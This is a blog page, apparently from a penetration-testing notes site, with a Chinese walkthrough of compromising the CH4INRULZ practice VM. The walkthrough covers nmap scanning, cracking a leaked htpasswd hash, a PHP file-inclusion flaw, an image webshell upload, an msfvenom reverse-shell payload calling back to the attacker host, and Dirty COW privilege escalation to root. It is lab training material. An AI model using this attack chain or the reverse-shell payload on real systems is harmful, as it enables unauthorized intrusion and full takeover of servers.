@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="靶机渗透记录—CH4INRULZ_v1.0.1文章首发于星盟安全公众号 打开靶机 信息搜集然后切换到攻击机 先去做信息搜集 扫描一下同网段内存活的主机 nmap -sP -n 192.168.191.0/24 扫到了一个192.168.191.129 探测一下 nmap -sS -sV -Pn  -n  192.168.191.129  加个-A探测更详细的版本信息 nmap -sS -sV -A">
+<meta name="keywords" content="渗透测试,靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透记录—CH4INRULZ_v1.0.1">
+<meta property="og:url" content="http://yoursite.com/2020/05/26/靶机渗透记录—CH4INRULZ-v1-0-1/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="靶机渗透记录—CH4INRULZ_v1.0.1文章首发于星盟安全公众号 打开靶机 信息搜集然后切换到攻击机 先去做信息搜集 扫描一下同网段内存活的主机 nmap -sP -n 192.168.191.0/24 扫到了一个192.168.191.129 探测一下 nmap -sS -sV -Pn  -n  192.168.191.129  加个-A探测更详细的版本信息 nmap -sS -sV -A">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://images.5666888.xyz//20200422125210.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422130247.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422130615.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422131357.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422131546.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422134954.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422135103.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422135707.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422131757.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422131852.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422132355.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422132339.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422132534.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422132905.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422132919.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422133112.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422140433.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422140936.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422141050.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422141253.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422142148.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422142253.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422142347.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422143537.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422143650.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422144053.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422144613.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422144956.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422163905.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422164440.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422164706.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422164909.png">
+<meta property="og:image" content="http://images.5666888.xyz//image-20200422164944727.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200422165035.png">
+<meta property="og:updated_time" content="2020-05-26T02:29:34.420Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="靶机渗透记录—CH4INRULZ_v1.0.1">
+<meta name="twitter:description" content="靶机渗透记录—CH4INRULZ_v1.0.1文章首发于星盟安全公众号 打开靶机 信息搜集然后切换到攻击机 先去做信息搜集 扫描一下同网段内存活的主机 nmap -sP -n 192.168.191.0/24 扫到了一个192.168.191.129 探测一下 nmap -sS -sV -Pn  -n  192.168.191.129  加个-A探测更详细的版本信息 nmap -sS -sV -A">
+<meta name="twitter:image" content="http://images.5666888.xyz//20200422125210.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/26/靶机渗透记录—CH4INRULZ-v1-0-1/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>靶机渗透记录—CH4INRULZ_v1.0.1 | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/26/靶机渗透记录—CH4INRULZ-v1-0-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">靶机渗透记录—CH4INRULZ_v1.0.1
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-05-26 10:28:00 / Modified: 10:29:34" itemprop="dateCreated datePublished" datetime="2020-05-26T10:28:00+08:00">2020-05-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="靶机渗透记录—CH4INRULZ-v1-0-1"><a href="#靶机渗透记录—CH4INRULZ-v1-0-1" class="headerlink" title="靶机渗透记录—CH4INRULZ_v1.0.1"></a>靶机渗透记录—CH4INRULZ_v1.0.1</h1><p><strong>文章首发于星盟安全公众号</strong></p>
+<h2 id="打开靶机"><a href="#打开靶机" class="headerlink" title="打开靶机"></a>打开靶机</h2><p><img src="http://images.5666888.xyz//20200422125210.png" alt></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>然后切换到攻击机 先去做信息搜集 扫描一下同网段内存活的主机</p>
+<p><code>nmap -sP -n 192.168.191.0/24</code></p>
+<p>扫到了一个<code>192.168.191.129</code></p>
+<p>探测一下</p>
+<p><code>nmap -sS -sV -Pn  -n  192.168.191.129</code></p>
+<p><img src="http://images.5666888.xyz//20200422130247.png" alt></p>
+<p>加个-A探测更详细的版本信息</p>
+<p><code>nmap -sS -sV -A  -Pn -n  -p- 192.168.191.129</code></p>
+<p><img src="http://images.5666888.xyz//20200422130615.png" alt></p>
+<p>扫描到了 21 22 80 8011端口 其中80 8011都是web服务</p>
+<h2 id="查看主站"><a href="#查看主站" class="headerlink" title="查看主站"></a>查看主站</h2><p>先去看看80端口吧 网站没啥东西 </p>
+<p><img src="http://images.5666888.xyz//20200422131357.png" alt></p>
+<p>扫描一下目录 </p>
+<p>发现可以目录访问网站</p>
+<p>扫描到了<a href="http://192.168.191.129/development/" target="_blank" rel="noopener">http://192.168.191.129/development/</a> 访问会让输入用户名和密码</p>
+<p><img src="http://images.5666888.xyz//20200422131546.png" alt></p>
+<p>试试admin + 弱口令 手动输入了几个都不对 </p>
+<p>还扫描到了一个备份文件index.html.bak  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is the default web page for this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The web server software is running but no content has been added, yet.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/development"</span>&gt;</span>development<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段貌似是用户名和密码 但是密码是经过加密的</p>
+<p><code>frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</code></p>
+<p>用john爆破一下</p>
+<p><img src="http://images.5666888.xyz//20200422134954.png" alt></p>
+<p>知道了用户名和密码</p>
+<p>frank:frank!!!</p>
+<p>登录<a href="http://192.168.191.129/development/页面" target="_blank" rel="noopener">http://192.168.191.129/development/页面</a></p>
+<p>网页如下  并没有什么东西 </p>
+<p><img src="http://images.5666888.xyz//20200422135103.png" alt></p>
+<p>看到提示是一个没有完成的上传界面</p>
+<p>通过猜关键词upload  uploads uploader</p>
+<p>找到一个文件上传点</p>
+<p><img src="http://images.5666888.xyz//20200422135707.png" alt></p>
+<p>看看能不能传个木马上去 几番尝试之后发现是白名单</p>
+<p><code>File is not an image.Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.Sorry, your file was not uploaded.</code></p>
+<p>只允许only JPG, JPEG, PNG &amp; GIF </p>
+<h2 id="查看旁站"><a href="#查看旁站" class="headerlink" title="查看旁站"></a>查看旁站</h2><p>再去看看8011端口</p>
+<p><img src="http://images.5666888.xyz//20200422131757.png" alt></p>
+<p>扫描一下 扫出来了 <a href="http://192.168.191.129:8011/api/" target="_blank" rel="noopener">http://192.168.191.129:8011/api/</a></p>
+<p><img src="http://images.5666888.xyz//20200422131852.png" alt></p>
+<p>这个API将用于与Frank的服务器通信</p>
+<p>但仍在开发中</p>
+<p>访问一下这些php文件</p>
+<p>发现只有 files_api.php 是存在的</p>
+<p><img src="http://images.5666888.xyz//20200422132355.png" alt></p>
+<p>翻译：</p>
+<p>没有传递给我名为file的参数</p>
+<p>*注意：这个API不使用json，所以以原始格式发送文件名</p>
+<p>那貌似是文件上传呀 先随便填一个file参数试一下</p>
+<p><img src="http://images.5666888.xyz//20200422132339.png" alt></p>
+<p>wrong input</p>
+<p>换个参数试试</p>
+<p><img src="http://images.5666888.xyz//20200422132534.png" alt></p>
+<p>没反应 那说明file参数是接收的</p>
+<p>接下来试一下post传参 没啥反应</p>
+<p><img src="http://images.5666888.xyz//20200422132905.png" alt></p>
+<p>换个内容 原来是可以任意读取的</p>
+<p><img src="http://images.5666888.xyz//20200422132919.png" alt></p>
+<p>用伪协议读一下页面源码试试</p>
+<p><img src="http://images.5666888.xyz//20200422133112.png" alt></p>
+<p>解码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file = $_POST[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">$get_file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($get_file))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;b&gt;********* HACKER DETECTED *********&lt;/b&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;YOUR IP IS : "</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/p&gt;&lt;p&gt;WRONG INPUT !!&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;No parameter called file passed to me&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;* Note : this API don't use json , so send the file name in raw format&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** else&#123;</span></span><br><span class="line"><span class="comment">echo strcmp($file,"/etc/passwd");</span></span><br><span class="line"><span class="comment">echo strlen($file);</span></span><br><span class="line"><span class="comment">echo strlen("/etc/passwd");</span></span><br><span class="line"><span class="comment">if($file == "/etc/passwd")&#123;</span></span><br><span class="line"><span class="comment">        "HACKER DETECTED ..";</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">&#125;**/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>post进去的可以被包含</p>
+<h2 id="Msf-Getshell"><a href="#Msf-Getshell" class="headerlink" title="Msf Getshell"></a>Msf Getshell</h2><p>回主站上传图片马</p>
+<p>加上GIF文件头 上传成功 </p>
+<p><img src="http://images.5666888.xyz//20200422140433.png" alt></p>
+<p>但是不知道上传到哪里去了  利用文件包含去猜一下</p>
+<p>apache服务器一般是在 /var/www/下</p>
+<p><code>file=php://filter/read=convert.base64-encode/resource=/var/www/development/uploader/upload.php</code></p>
+<p><img src="http://images.5666888.xyz//20200422140936.png" alt></p>
+<p>base64解密后拿到了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">"FRANKuploads/"</span>;</span><br><span class="line">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if file already exists</span></span><br><span class="line"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, file already exists."</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check file size</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType != <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></span><br><span class="line">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span>;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"The file "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded to my uploads path."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Sorry, there was an error uploading your file."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第二行就看到了目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target_dir = <span class="string">"FRANKuploads/"</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200422141050.png" alt></p>
+<p>再回旁站去包含</p>
+<p><img src="http://images.5666888.xyz//20200422141253.png" alt></p>
+<p>成功访问大马 但是不是一直包含是没法用的</p>
+<p>那就用msf生成一个反弹shell的马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.191</span><span class="number">.128</span>  LPORT=<span class="number">8888</span> -f raw -o <span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
+<p>然后启动监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.191.128</span><br><span class="line">lhost =&gt; 192.168.191.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport  8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200422142148.png" alt></p>
+<p>msf准备好了 接下来去上传然后包含</p>
+<p>成功反弹</p>
+<p><img src="http://images.5666888.xyz//20200422142253.png" alt></p>
+<p>只有个www-data权限 在msf的shell里总是有乱码 所以想传个马方便一些</p>
+<p><img src="http://images.5666888.xyz//20200422142347.png" alt></p>
+<p>查看当前目录是/var/anotherwww/api   </p>
+<p>传一个大马上去 发现只有FRANKuploads文件夹有权限上传</p>
+<p><img src="http://images.5666888.xyz//20200422143537.png" alt></p>
+<p>有了大马 舒服了很多</p>
+<p><img src="http://images.5666888.xyz//20200422143650.png" alt></p>
+<h2 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h2><p>在大马里执行命令 查看系统内核版本</p>
+<p><img src="http://images.5666888.xyz//20200422144053.png" alt></p>
+<p>上传一个linux exp探索工具</p>
+<p><img src="http://images.5666888.xyz//20200422144613.png" alt></p>
+<p>然后加一个执行权限</p>
+<p><code>chmod +x linux-exploit-suggester.sh</code></p>
+<p>执行<code>./chmod +x linux-exploit-suggester.sh</code></p>
+<p>工具给出一些建议  尝试相应的poc</p>
+<p><img src="http://images.5666888.xyz//20200422144956.png" alt></p>
+<p>来用CVE-2016-5195(脏牛)提权 去网上找个</p>
+<p>百度到的脏牛提权复现文章：<a href="https://blog.csdn.net/haha13l4/article/details/96913574" target="_blank" rel="noopener">https://blog.csdn.net/haha13l4/article/details/96913574</a></p>
+<p> poc下载:<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a> </p>
+<p>下载exp 然后编译一下</p>
+<p><code>gcc -pthread dirty.c -o dirty -lcrypt</code></p>
+<p>然后把编译完的exp上传到靶机 </p>
+<p>然后赋予执行权限<code>chmod +x dirty</code></p>
+<h3 id="缺少依赖报错"><a href="#缺少依赖报错" class="headerlink" title="缺少依赖报错"></a>缺少依赖报错</h3><p>执行的时候却遇到了缺少依赖的错误 应该是gcc缺少依赖的原因</p>
+<p> <img src="http://images.5666888.xyz//20200422163905.png" alt></p>
+<p>那我就换个虚拟机再去编译一下</p>
+<p>于是换到另一个ubuntu虚拟机重新编译</p>
+<p><code>gcc -pthread dirty.c -o dirty -lcrypt</code></p>
+<p>重新上传并赋予执行权限</p>
+<p>提权成功</p>
+<p><img src="http://images.5666888.xyz//20200422164440.png" alt></p>
+<p>现在我们可以用找个用户名和密码登录了</p>
+<p><img src="http://images.5666888.xyz//20200422164706.png" alt></p>
+<p>直接ssh登录</p>
+<p><img src="http://images.5666888.xyz//20200422164909.png" alt></p>
+<p>看一下权限 已经获得了root</p>
+<p><img src="http://images.5666888.xyz//image-20200422164944727.png" alt></p>
+<p>拿到root.txt</p>
+<p><img src="http://images.5666888.xyz//20200422165035.png" alt></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.该靶机信息搜集阶段很重要，扫描的时候好的字典很重要</p>
+<p>2.主站没思路去旁站</p>
+<p>3.提权有问题多百度该漏洞的复现文章，过程中报错就百度错误，总会解决的</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+            <a href="/tags/靶机渗透/" rel="tag"># 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
